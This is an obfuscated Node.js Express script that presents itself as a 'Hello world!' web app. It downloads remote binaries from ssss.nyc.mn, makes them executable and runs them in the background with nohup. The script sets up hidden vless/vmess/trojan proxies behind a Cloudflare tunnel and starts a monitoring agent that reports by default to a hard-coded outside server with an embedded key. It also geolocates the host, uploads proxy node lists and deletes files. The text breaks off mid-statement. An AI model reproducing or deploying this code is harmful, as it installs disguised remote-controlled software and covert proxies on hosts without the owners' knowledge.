const _0x2ee8e0=_0x8f62;(function(_0x159446,_0x5b9977){const _0x1c7fdd={_0x3d2abf:0x185,_0x8bb13:0x1db,_0x10c199:0x1ae,_0x356594:0x17a,_0x2b4207:0x1ee,_0x18e491:0x1f7,_0x42d850:0x18a},_0x39afa7=_0x8f62,_0x5b085a=_0x159446();while(!![]){try{const _0x56cf30=-parseInt(_0x39afa7(0x197))/0x1+-parseInt(_0x39afa7(_0x1c7fdd._0x3d2abf))/0x2*(-parseInt(_0x39afa7(_0x1c7fdd._0x8bb13))/0x3)+-parseInt(_0x39afa7(_0x1c7fdd._0x10c199))/0x4+-parseInt(_0x39afa7(_0x1c7fdd._0x356594))/0x5+-parseInt(_0x39afa7(_0x1c7fdd._0x2b4207))/0x6+-parseInt(_0x39afa7(_0x1c7fdd._0x18e491))/0x7+parseInt(_0x39afa7(0x17d))/0x8*(parseInt(_0x39afa7(_0x1c7fdd._0x42d850))/0x9);if(_0x56cf30===_0x5b9977)break;else _0x5b085a['push'](_0x5b085a['shift']());}catch(_0x5cae24){_0x5b085a['push'](_0x5b085a['shift']());}}}(_0x346d,0x2646c));const express=require(_0x2ee8e0(0x18e)),app=express(),axios=require(_0x2ee8e0(0x16c)),os=require('os'),fs=require('fs'),path=require(_0x2ee8e0(0x1f5)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x2ee8e0(0x214)]),{execSync}=require(_0x2ee8e0(0x1c1)),UPLOAD_URL=process['env'][_0x2ee8e0(0x16f)]||'',PROJECT_URL=process['env'][_0x2ee8e0(0x200)]||'',AUTO_ACCESS=process['env'][_0x2ee8e0(0x204)]||![],FILE_PATH=process[_0x2ee8e0(0x1f8)]['FILE_PATH']||_0x2ee8e0(0x1b8),SUB_PATH=process['env'][_0x2ee8e0(0x1a2)]||_0x2ee8e0(0x1bb),PORT=process[_0x2ee8e0(0x1f8)][_0x2ee8e0(0x187)]||process['env'][_0x2ee8e0(0x1c7)]||0xbb8,UUID=process[_0x2ee8e0(0x1f8)][_0x2ee8e0(0x1b0)]||_0x2ee8e0(0x177),NEZHA_SERVER=process[_0x2ee8e0(0x1f8)][_0x2ee8e0(0x16d)]||'leahk.piafa.eu.org',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2ee8e0(0x1f8)]['NEZHA_KEY']||_0x2ee8e0(0x217),ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x2ee8e0(0x1f8)][_0x2ee8e0(0x1fe)]||'',ARGO_PORT=process[_0x2ee8e0(0x1f8)][_0x2ee8e0(0x219)]||0x1f41,CFIP=process['env'][_0x2ee8e0(0x19a)]||_0x2ee8e0(0x211),CFPORT=process['env'][_0x2ee8e0(0x222)]||0x1bb,NAME=process['env'][_0x2ee8e0(0x1b9)]||'';!fs[_0x2ee8e0(0x1f9)](FILE_PATH)?(fs[_0x2ee8e0(0x1f0)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x2ee8e0(0x212)](FILE_PATH+_0x2ee8e0(0x184));function generateRandomName(){const _0x3242d4={_0x3ecdce:0x1bf,_0x21b472:0x18f},_0x507f33=_0x2ee8e0,_0x46a624=_0x507f33(0x19e);let _0xb3a67a='';for(let _0x30fcf8=0x0;_0x30fcf8<0x6;_0x30fcf8++){_0xb3a67a+=_0x46a624['charAt'](Math[_0x507f33(_0x3242d4._0x3ecdce)](Math[_0x507f33(_0x3242d4._0x21b472)]()*_0x46a624['length']));}return _0xb3a67a;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x8f62(_0x1cc4b0,_0x1b5ef4){const _0x346d5e=_0x346d();return _0x8f62=function(_0x8f6245,_0x23eea0){_0x8f6245=_0x8f6245-0x169;let _0x575a2b=_0x346d5e[_0x8f6245];return _0x575a2b;},_0x8f62(_0x1cc4b0,_0x1b5ef4);}let npmPath=path[_0x2ee8e0(0x1ea)](FILE_PATH,npmName),phpPath=path[_0x2ee8e0(0x1ea)](FILE_PATH,phpName),webPath=path[_0x2ee8e0(0x1ea)](FILE_PATH,webName),botPath=path[_0x2ee8e0(0x1ea)](FILE_PATH,botName),subPath=path[_0x2ee8e0(0x1ea)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x2ee8e0(0x1bc)),bootLogPath=path['join'](FILE_PATH,_0x2ee8e0(0x1e8)),configPath=path['join'](FILE_PATH,_0x2ee8e0(0x1c3));function deleteNodes(){const _0x2a84fb={_0x1ea83c:0x17c,_0x223b4b:0x1ba,_0x4aa56c:0x218,_0x4b36a0:0x175,_0x9afbf7:0x1b4,_0x5abc32:0x1be,_0xe5a2e1:0x169},_0x236355=_0x2ee8e0;try{if(!UPLOAD_URL)return;if(!fs[_0x236355(0x1f9)](subPath))return;let _0xe4447;try{_0xe4447=fs[_0x236355(_0x2a84fb._0x1ea83c)](subPath,_0x236355(0x218));}catch{return null;}const _0x28c741=Buffer[_0x236355(0x1cb)](_0xe4447,_0x236355(_0x2a84fb._0x223b4b))[_0x236355(0x202)](_0x236355(_0x2a84fb._0x4aa56c)),_0x4226ee=_0x28c741[_0x236355(_0x2a84fb._0x4b36a0)]('\x0a')[_0x236355(_0x2a84fb._0x9afbf7)](_0x24a876=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x236355(0x1b1)](_0x24a876));if(_0x4226ee[_0x236355(0x1a4)]===0x0)return;return axios[_0x236355(_0x2a84fb._0x5abc32)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x236355(_0x2a84fb._0xe5a2e1)]({'nodes':_0x4226ee}),{'headers':{'Content-Type':'application/json'}})[_0x236355(0x1d5)](_0x437f8e=>{return null;}),null;}catch(_0x4ad853){return null;}}function cleanupOldFiles(){const _0x22c9c5={_0x102c8d:0x1f1},_0xa18c21={_0x45503d:0x1ea,_0x322a57:0x21c,_0x4d88e9:0x21d},_0x27facf=_0x2ee8e0;try{const _0x20b7a8=fs[_0x27facf(_0x22c9c5._0x102c8d)](FILE_PATH);_0x20b7a8[_0x27facf(0x189)](_0x5d5dbf=>{const _0x1538f0=_0x27facf,_0x4281fc=path[_0x1538f0(_0xa18c21._0x45503d)](FILE_PATH,_0x5d5dbf);try{const _0x2db148=fs[_0x1538f0(_0xa18c21._0x322a57)](_0x4281fc);_0x2db148[_0x1538f0(_0xa18c21._0x4d88e9)]()&&fs['unlinkSync'](_0x4281fc);}catch(_0x2f0e08){}});}catch(_0x2af584){}}app['get']('/',function(_0x4978b1,_0x4b51d7){const _0x200ee9={_0x5dbbc4:0x1df},_0x39814b=_0x2ee8e0;_0x4b51d7[_0x39814b(_0x200ee9._0x5dbbc4)]('Hello\x20world!');});async function generateConfig(){const _0x34a7ef={_0x56e69b:0x193,_0x5d630b:0x220,_0x267670:0x1ce,_0x36d3b0:0x19f,_0x19aab4:0x18d,_0x58f368:0x1ad,_0x1adee9:0x208,_0x53ad9a:0x1ad,_0x1c58dd:0x1d8,_0x1f3f9b:0x1c6,_0x1c7a45:0x1ed,_0x1f4ed6:0x1c6,_0x1c0de1:0x215,_0x400f57:0x1c6,_0x221cf6:0x1fc,_0xdd6287:0x16a},_0x51dea8=_0x2ee8e0,_0x32ed3e={'log':{'access':_0x51dea8(_0x34a7ef._0x56e69b),'error':_0x51dea8(0x193),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x51dea8(_0x34a7ef._0x5d630b)}],'decryption':_0x51dea8(_0x34a7ef._0x267670),'fallbacks':[{'dest':0xbb9},{'path':_0x51dea8(0x20d),'dest':0xbba},{'path':_0x51dea8(0x1ed),'dest':0xbbb},{'path':_0x51dea8(_0x34a7ef._0x36d3b0),'dest':0xbbc}]},'streamSettings':{'network':_0x51dea8(0x208)}},{'port':0xbb9,'listen':_0x51dea8(_0x34a7ef._0x19aab4),'protocol':_0x51dea8(_0x34a7ef._0x58f368),'settings':{'clients':[{'id':UUID}],'decryption':_0x51dea8(0x1ce)},'streamSettings':{'network':_0x51dea8(_0x34a7ef._0x1adee9),'security':'none'}},{'port':0xbba,'listen':_0x51dea8(_0x34a7ef._0x19aab4),'protocol':_0x51dea8(_0x34a7ef._0x53ad9a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x51dea8(_0x34a7ef._0x267670)},'streamSettings':{'network':'ws','security':_0x51dea8(0x1ce),'wsSettings':{'path':_0x51dea8(0x20d)}},'sniffing':{'enabled':!![],'destOverride':[_0x51dea8(0x21a),_0x51dea8(_0x34a7ef._0x1c58dd),_0x51dea8(_0x34a7ef._0x1f3f9b)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x51dea8(0x209),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x51dea8(_0x34a7ef._0x1c7a45)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x51dea8(_0x34a7ef._0x1f4ed6)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x51dea8(_0x34a7ef._0x19aab4),'protocol':_0x51dea8(_0x34a7ef._0x1c0de1),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x51dea8(0x19f)}},'sniffing':{'enabled':!![],'destOverride':[_0x51dea8(0x21a),_0x51dea8(0x1d8),_0x51dea8(_0x34a7ef._0x400f57)],'metadataOnly':![]}}],'dns':{'servers':[_0x51dea8(_0x34a7ef._0x221cf6)]},'outbounds':[{'protocol':'freedom','tag':_0x51dea8(0x1e3)},{'protocol':'blackhole','tag':_0x51dea8(_0x34a7ef._0xdd6287)}]};fs['writeFileSync'](path[_0x51dea8(0x1ea)](FILE_PATH,_0x51dea8(0x1c3)),JSON['stringify'](_0x32ed3e,null,0x2));}function getSystemArchitecture(){const _0x174b1a={_0x1c81e8:0x1d3,_0x86a5e6:0x1ab},_0x4603db=_0x2ee8e0,_0x40dd6d=os[_0x4603db(_0x174b1a._0x1c81e8)]();return _0x40dd6d===_0x4603db(0x1ab)||_0x40dd6d===_0x4603db(0x210)||_0x40dd6d==='aarch64'?_0x4603db(_0x174b1a._0x86a5e6):'amd';}function downloadFile(_0x2a871c,_0x269ff4,_0x365118){const _0x55a3e6={_0x52a16f:0x1f0,_0x51a1c8:0x1a5,_0x569b25:0x1d2},_0x5bd9b3={_0x10633f:0x1e7,_0x17fb3e:0x1d4,_0x1c913:0x1ca,_0x1e49bd:0x1d9},_0xe751b2={_0x2286a5:0x1b5},_0x222fd5={_0x4515ad:0x1d9},_0x27ca5a={_0x277232:0x1b7,_0xdd3df7:0x212,_0x4b6fb8:0x1e7,_0x541f06:0x1d4,_0x33c631:0x1c0},_0x3a07fe=_0x2ee8e0,_0x4ee1a9=_0x2a871c;!fs[_0x3a07fe(0x1f9)](FILE_PATH)&&fs[_0x3a07fe(_0x55a3e6._0x52a16f)](FILE_PATH,{'recursive':!![]});const _0xd86282=fs[_0x3a07fe(_0x55a3e6._0x51a1c8)](_0x4ee1a9);axios({'method':_0x3a07fe(0x18b),'url':_0x269ff4,'responseType':_0x3a07fe(_0x55a3e6._0x569b25)})[_0x3a07fe(0x1e2)](_0x23cf1e=>{const _0xcf5995=_0x3a07fe;_0x23cf1e[_0xcf5995(0x207)]['pipe'](_0xd86282),_0xd86282['on'](_0xcf5995(_0xe751b2._0x2286a5),()=>{const _0x46fb58=_0xcf5995;_0xd86282[_0x46fb58(_0x27ca5a._0x277232)](),console[_0x46fb58(_0x27ca5a._0xdd3df7)](_0x46fb58(_0x27ca5a._0x4b6fb8)+path[_0x46fb58(_0x27ca5a._0x541f06)](_0x4ee1a9)+_0x46fb58(_0x27ca5a._0x33c631)),_0x365118(null,_0x4ee1a9);}),_0xd86282['on'](_0xcf5995(0x1d9),_0x2dfabd=>{const _0x56b198=_0xcf5995;fs[_0x56b198(0x1c9)](_0x4ee1a9,()=>{});const _0x35905f=_0x56b198(0x1e7)+path[_0x56b198(0x1d4)](_0x4ee1a9)+'\x20failed:\x20'+_0x2dfabd[_0x56b198(0x178)];console[_0x56b198(_0x222fd5._0x4515ad)](_0x35905f),_0x365118(_0x35905f);});})['catch'](_0xfe7e7a=>{const _0x116fb5=_0x3a07fe,_0x1070e3=_0x116fb5(_0x5bd9b3._0x10633f)+path[_0x116fb5(_0x5bd9b3._0x17fb3e)](_0x4ee1a9)+_0x116fb5(_0x5bd9b3._0x1c913)+_0xfe7e7a['message'];console[_0x116fb5(_0x5bd9b3._0x1e49bd)](_0x1070e3),_0x365118(_0x1070e3);});}async function downloadFilesAndRun(){const _0x1d05af={_0xd1063b:0x1a4,_0x3bb0c6:0x212,_0x31ee57:0x1d1,_0x4bcb7f:0x1ac,_0x49ef96:0x1e6,_0x4faada:0x198,_0xb1ab52:0x1c8,_0x232afa:0x1f3,_0x99763c:0x1d9,_0x4f2cc9:0x194,_0x4ba30b:0x1d0,_0x55d7b8:0x1eb,_0x46f972:0x1bd,_0x5dbe3c:0x212,_0x17451e:0x1dd,_0x3f6c10:0x212,_0x4c5e9b:0x223,_0x8872a6:0x1cd,_0x2df834:0x186,_0x3bb469:0x1e9,_0x28cc1e:0x1ef,_0x547d18:0x21e,_0x1569c7:0x1e5},_0x5314ff={_0x3c0c69:0x1f9},_0x14b60c=_0x2ee8e0,_0x3ade02=getSystemArchitecture(),_0x5e02d7=getFilesForArchitecture(_0x3ade02);if(_0x5e02d7[_0x14b60c(_0x1d05af._0xd1063b)]===0x0){console[_0x14b60c(_0x1d05af._0x3bb0c6)](_0x14b60c(0x1f2));return;}const _0x2f90ca=_0x5e02d7[_0x14b60c(_0x1d05af._0x31ee57)](_0xc829be=>{return new Promise((_0x4b0aac,_0x46eae0)=>{const _0x23793e=_0x8f62;downloadFile(_0xc829be[_0x23793e(0x1a9)],_0xc829be[_0x23793e(0x224)],(_0x40c5ae,_0x487d65)=>{_0x40c5ae?_0x46eae0(_0x40c5ae):_0x4b0aac(_0x487d65);});});});try{await Promise[_0x14b60c(0x1c4)](_0x2f90ca);}catch(_0x2db511){console['error'](_0x14b60c(0x1b6),_0x2db511);return;}function _0x23262f(_0x56fd2c){const _0x4c5fe1={_0x4c600c:0x1d9,_0x11cd52:0x1dc,_0x663a55:0x202},_0x328c75=_0x14b60c,_0x5e1350=0x1fd;_0x56fd2c[_0x328c75(0x189)](_0x3ed470=>{const _0x4b8e49=_0x328c75;fs[_0x4b8e49(_0x5314ff._0x3c0c69)](_0x3ed470)&&fs[_0x4b8e49(0x1e0)](_0x3ed470,_0x5e1350,_0x4deaaf=>{const _0x1d1a8d=_0x4b8e49;_0x4deaaf?console[_0x1d1a8d(_0x4c5fe1._0x4c600c)]('Empowerment\x20failed\x20for\x20'+_0x3ed470+':\x20'+_0x4deaaf):console[_0x1d1a8d(0x212)](_0x1d1a8d(_0x4c5fe1._0x11cd52)+_0x3ed470+':\x20'+_0x5e1350[_0x1d1a8d(_0x4c5fe1._0x663a55)](0x8));});});}const _0x4fbe18=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x23262f(_0x4fbe18);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4bfe6a=NEZHA_SERVER[_0x14b60c(0x1ff)](':')?NEZHA_SERVER[_0x14b60c(0x175)](':')[_0x14b60c(0x213)]():'',_0x4428e0=new Set(['443','8443',_0x14b60c(0x1eb),_0x14b60c(0x1ec),_0x14b60c(_0x1d05af._0x4bcb7f),'2053']),_0x394752=_0x4428e0[_0x14b60c(0x20f)](_0x4bfe6a)?_0x14b60c(_0x1d05af._0x49ef96):'false',_0x1f3867='\x0aclient_secret:\x20'+NEZHA_KEY+_0x14b60c(_0x1d05af._0x4faada)+NEZHA_SERVER+_0x14b60c(_0x1d05af._0xb1ab52)+_0x394752+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x14b60c(0x1ea)](FILE_PATH,'config.yaml'),_0x1f3867);const _0x2f10d7='nohup\x20'+phpPath+_0x14b60c(0x19d)+FILE_PATH+_0x14b60c(0x1a7);try{await exec(_0x2f10d7),console[_0x14b60c(_0x1d05af._0x3bb0c6)](phpName+_0x14b60c(_0x1d05af._0x232afa)),await new Promise(_0x1a1cd4=>setTimeout(_0x1a1cd4,0x3e8));}catch(_0x4111d1){console[_0x14b60c(_0x1d05af._0x99763c)](_0x14b60c(_0x1d05af._0x4f2cc9)+_0x4111d1);}}else{let _0x3960a8='';const _0x4b7364=[_0x14b60c(_0x1d05af._0x4ba30b),_0x14b60c(0x20e),_0x14b60c(_0x1d05af._0x55d7b8),_0x14b60c(0x1ec),_0x14b60c(0x1ac),_0x14b60c(0x16b)];_0x4b7364['includes'](NEZHA_PORT)&&(_0x3960a8='--tls');const _0x55d7c7='nohup\x20'+npmPath+_0x14b60c(0x20a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x14b60c(_0x1d05af._0x46f972)+NEZHA_KEY+'\x20'+_0x3960a8+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x55d7c7),console[_0x14b60c(_0x1d05af._0x5dbe3c)](npmName+_0x14b60c(_0x1d05af._0x232afa)),await new Promise(_0x587645=>setTimeout(_0x587645,0x3e8));}catch(_0x437386){console[_0x14b60c(0x1d9)](_0x14b60c(_0x1d05af._0x17451e)+_0x437386);}}}else console[_0x14b60c(_0x1d05af._0x3f6c10)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x23515c=_0x14b60c(_0x1d05af._0x4c5e9b)+webPath+_0x14b60c(0x19c)+FILE_PATH+_0x14b60c(_0x1d05af._0x8872a6);try{await exec(_0x23515c),console['log'](webName+'\x20is\x20running'),await new Promise(_0x22be67=>setTimeout(_0x22be67,0x3e8));}catch(_0xfeef1c){console['error'](_0x14b60c(_0x1d05af._0x2df834)+_0xfeef1c);}if(fs[_0x14b60c(0x1f9)](botPath)){let _0x2de1de;if(ARGO_AUTH[_0x14b60c(0x1ef)](/^[A-Z0-9a-z=]{120,250}$/))_0x2de1de=_0x14b60c(_0x1d05af._0x3bb469)+ARGO_AUTH;else ARGO_AUTH[_0x14b60c(_0x1d05af._0x28cc1e)](/TunnelSecret/)?_0x2de1de='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x2de1de=_0x14b60c(_0x1d05af._0x547d18)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x14b60c(0x223)+botPath+'\x20'+_0x2de1de+'\x20>/dev/null\x202>&1\x20&'),console[_0x14b60c(0x212)](botName+_0x14b60c(_0x1d05af._0x232afa)),await new Promise(_0x3ac021=>setTimeout(_0x3ac021,0x7d0));}catch(_0x2fff26){console[_0x14b60c(0x1d9)](_0x14b60c(_0x1d05af._0x1569c7)+_0x2fff26);}}await new Promise(_0x18463c=>setTimeout(_0x18463c,0x1388));}function getFilesForArchitecture(_0x488419){const _0x2010a4={_0x2298dd:0x1ab,_0xc00a26:0x1ab,_0x20414b:0x170},_0x226740=_0x2ee8e0;let _0x37b41c;_0x488419===_0x226740(_0x2010a4._0x2298dd)?_0x37b41c=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x226740(0x196)}]:_0x37b41c=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3b589a=_0x488419===_0x226740(0x1ab)?_0x226740(0x17e):_0x226740(0x203);_0x37b41c['unshift']({'fileName':npmPath,'fileUrl':_0x3b589a});}else{const _0x1f87c1=_0x488419===_0x226740(_0x2010a4._0xc00a26)?'https://arm64.ssss.nyc.mn/v1':_0x226740(_0x2010a4._0x20414b);_0x37b41c[_0x226740(0x17f)]({'fileName':phpPath,'fileUrl':_0x1f87c1});}}return _0x37b41c;}function argoType(){const _0x2fd40b={_0x593b02:0x1c5,_0x23ebcb:0x18c,_0x17271c:0x175,_0x56f7f9:0x190,_0x39f142:0x1ea,_0x4b3d4d:0x1cc},_0xeb0a79=_0x2ee8e0;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0xeb0a79(0x16e));return;}if(ARGO_AUTH[_0xeb0a79(0x1ff)](_0xeb0a79(0x1d7))){fs[_0xeb0a79(_0x2fd40b._0x593b02)](path['join'](FILE_PATH,_0xeb0a79(_0x2fd40b._0x23ebcb)),ARGO_AUTH);const _0x43d1c8='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0xeb0a79(_0x2fd40b._0x17271c)]('\x22')[0xb]+_0xeb0a79(0x1e1)+path[_0xeb0a79(0x1ea)](FILE_PATH,_0xeb0a79(0x18c))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0xeb0a79(0x1f4)+ARGO_PORT+_0xeb0a79(_0x2fd40b._0x56f7f9);fs[_0xeb0a79(_0x2fd40b._0x593b02)](path[_0xeb0a79(_0x2fd40b._0x39f142)](FILE_PATH,_0xeb0a79(_0x2fd40b._0x4b3d4d)),_0x43d1c8);}else console[_0xeb0a79(0x212)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x4ef7fa={_0x3c47e0:0x212,_0x2dc809:0x1da,_0x56e43a:0x17c,_0x4398d2:0x1ea,_0x2322ed:0x175,_0x1ee882:0x1a4,_0x3b5e41:0x179,_0xd43b0b:0x223,_0x311578:0x199},_0x3bb8b9={_0x5d7010:0x18b,_0x4c96b6:0x207,_0x43a023:0x19b,_0xb19b52:0x207,_0x381826:0x1a0,_0x47fcea:0x207,_0x2e1c53:0x1a0,_0x2b6993:0x216,_0x366154:0x1a0},_0x5331ce={_0x70f71c:0x17b,_0x591b5c:0x174,_0x2a6628:0x1b2,_0x213647:0x1a8,_0x4ea518:0x181},_0x2a3893={_0x7cdc71:0x1ef},_0x282958=_0x2ee8e0;let _0x5e3ac3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5e3ac3=ARGO_DOMAIN,console[_0x282958(_0x4ef7fa._0x3c47e0)](_0x282958(_0x4ef7fa._0x2dc809),_0x5e3ac3),await _0x53bcf4(_0x5e3ac3);else try{const _0x4f3236=fs[_0x282958(_0x4ef7fa._0x56e43a)](path[_0x282958(_0x4ef7fa._0x4398d2)](FILE_PATH,_0x282958(0x1e8)),'utf-8'),_0x4f952e=_0x4f3236[_0x282958(_0x4ef7fa._0x2322ed)]('\x0a'),_0x23d88c=[];_0x4f952e['forEach'](_0x26cf81=>{const _0x42b744=_0x282958,_0x3fdfb5=_0x26cf81[_0x42b744(_0x2a3893._0x7cdc71)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3fdfb5){const _0x5ed838=_0x3fdfb5[0x1];_0x23d88c['push'](_0x5ed838);}});if(_0x23d88c[_0x282958(_0x4ef7fa._0x1ee882)]>0x0)_0x5e3ac3=_0x23d88c[0x0],console['log'](_0x282958(0x1fa),_0x5e3ac3),await _0x53bcf4(_0x5e3ac3);else{console[_0x282958(0x212)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x282958(_0x4ef7fa._0x3b5e41)](path[_0x282958(0x1ea)](FILE_PATH,_0x282958(0x1e8)));async function _0x1b11b8(){const _0xbf49b5=_0x282958;try{process[_0xbf49b5(_0x5331ce._0x70f71c)]===_0xbf49b5(_0x5331ce._0x591b5c)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0xbf49b5(_0x5331ce._0x2a6628)):await exec(_0xbf49b5(0x192)+botName[_0xbf49b5(_0x5331ce._0x213647)](0x0)+']'+botName[_0xbf49b5(_0x5331ce._0x4ea518)](0x1)+_0xbf49b5(0x221));}catch(_0x14d3bc){}}_0x1b11b8(),await new Promise(_0x37d1e8=>setTimeout(_0x37d1e8,0xbb8));const _0x1995e7=_0x282958(0x21e)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x282958(_0x4ef7fa._0xd43b0b)+botPath+'\x20'+_0x1995e7+_0x282958(_0x4ef7fa._0x311578)),console['log'](botName+_0x282958(0x1f3)),await new Promise(_0x4988b5=>setTimeout(_0x4988b5,0xbb8)),await extractDomains();}catch(_0x11dcc3){console[_0x282958(0x1d9)](_0x282958(0x1e5)+_0x11dcc3);}}}catch(_0x26a4f3){console[_0x282958(0x1d9)]('Error\x20reading\x20boot.log:',_0x26a4f3);}async function _0x1cc0cc(){const _0x2d59fe=_0x282958;try{const _0x7eed91=await axios[_0x2d59fe(_0x3bb8b9._0x5d7010)](_0x2d59fe(0x206),{'timeout':0xbb8});if(_0x7eed91[_0x2d59fe(_0x3bb8b9._0x4c96b6)]&&_0x7eed91[_0x2d59fe(0x207)][_0x2d59fe(_0x3bb8b9._0x43a023)]&&_0x7eed91[_0x2d59fe(_0x3bb8b9._0xb19b52)][_0x2d59fe(_0x3bb8b9._0x381826)])return _0x7eed91[_0x2d59fe(_0x3bb8b9._0x47fcea)][_0x2d59fe(0x19b)]+'_'+_0x7eed91[_0x2d59fe(_0x3bb8b9._0x4c96b6)][_0x2d59fe(_0x3bb8b9._0x2e1c53)];}catch(_0x536d6f){try{const _0x2ecbd7=await axios[_0x2d59fe(_0x3bb8b9._0x5d7010)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x2ecbd7[_0x2d59fe(_0x3bb8b9._0xb19b52)]&&_0x2ecbd7[_0x2d59fe(_0x3bb8b9._0x4c96b6)][_0x2d59fe(_0x3bb8b9._0x2b6993)]==='success'&&_0x2ecbd7[_0x2d59fe(0x207)][_0x2d59fe(0x1fd)]&&_0x2ecbd7[_0x2d59fe(_0x3bb8b9._0xb19b52)][_0x2d59fe(_0x3bb8b9._0x366154)])return _0x2ecbd7[_0x2d59fe(0x207)][_0x2d59fe(0x1fd)]+'_'+_0x2ecbd7['data'][_0x2d59fe(_0x3bb8b9._0x2e1c53)];}catch(_0x2ec448){}}return'Unknown';}async function _0x53bcf4(_0x2b65a4){const _0x910abb={_0x376e2f:0x1ce,_0x390732:0x1de,_0x389c03:0x1f6,_0xf8648f:0x202,_0x494690:0x1e4,_0x502e7e:0x1c2,_0x28bd61:0x212,_0x206891:0x1cb,_0x28cf0f:0x202,_0x536cfc:0x202,_0x110960:0x1ba,_0x3a937e:0x18b},_0xdcfa46=await _0x1cc0cc(),_0x1940dc=NAME?NAME+'-'+_0xdcfa46:_0xdcfa46;return new Promise(_0x6726e5=>{setTimeout(()=>{const _0xe86073={_0x5174dd:0x1cb,_0x32d22e:0x1ba,_0x316257:0x20c,_0x5ceced:0x1df},_0x2327a5=_0x8f62,_0xa7f3c1={'v':'2','ps':''+_0x1940dc,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2327a5(0x1ce),'net':'ws','type':_0x2327a5(_0x910abb._0x376e2f),'host':_0x2b65a4,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x2b65a4,'alpn':'','fp':'firefox'},_0x24f5b7='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x2327a5(_0x910abb._0x390732)+_0x2b65a4+'&fp=firefox&type=ws&host='+_0x2b65a4+_0x2327a5(_0x910abb._0x389c03)+_0x1940dc+_0x2327a5(0x1aa)+Buffer['from'](JSON[_0x2327a5(0x169)](_0xa7f3c1))[_0x2327a5(_0x910abb._0xf8648f)](_0x2327a5(0x1ba))+_0x2327a5(0x171)+UUID+'@'+CFIP+':'+CFPORT+_0x2327a5(_0x910abb._0x494690)+_0x2b65a4+'&fp=firefox&type=ws&host='+_0x2b65a4+_0x2327a5(_0x910abb._0x502e7e)+_0x1940dc+_0x2327a5(0x173);console[_0x2327a5(_0x910abb._0x28bd61)](Buffer[_0x2327a5(_0x910abb._0x206891)](_0x24f5b7)[_0x2327a5(_0x910abb._0x28cf0f)](_0x2327a5(0x1ba))),fs[_0x2327a5(0x1c5)](subPath,Buffer[_0x2327a5(_0x910abb._0x206891)](_0x24f5b7)[_0x2327a5(_0x910abb._0x536cfc)](_0x2327a5(_0x910abb._0x110960))),console[_0x2327a5(_0x910abb._0x28bd61)](FILE_PATH+_0x2327a5(0x21b)),uploadNodes(),app[_0x2327a5(_0x910abb._0x3a937e)]('/'+SUB_PATH,(_0xe2350f,_0x29444c)=>{const _0x14cb09=_0x2327a5,_0x22980f=Buffer[_0x14cb09(_0xe86073._0x5174dd)](_0x24f5b7)[_0x14cb09(0x202)](_0x14cb09(_0xe86073._0x32d22e));_0x29444c['set'](_0x14cb09(0x1a6),_0x14cb09(_0xe86073._0x316257)),_0x29444c[_0x14cb09(_0xe86073._0x5ceced)](_0x22980f);}),_0x6726e5(_0x24f5b7);},0x7d0);});}}async function uploadNodes(){const _0x360f95={_0xf47860:0x191,_0x198449:0x1d6,_0x3782fd:0x216,_0x54e564:0x17c,_0x3b6ae6:0x175,_0x3b8599:0x1b4,_0x83218f:0x169,_0x44b263:0x191,_0x5d2776:0x172},_0x134812=_0x2ee8e0;if(UPLOAD_URL&&PROJECT_URL){const _0x502376=PROJECT_URL+'/'+SUB_PATH,_0x589182={'subscription':[_0x502376]};try{const _0x4d52ae=await 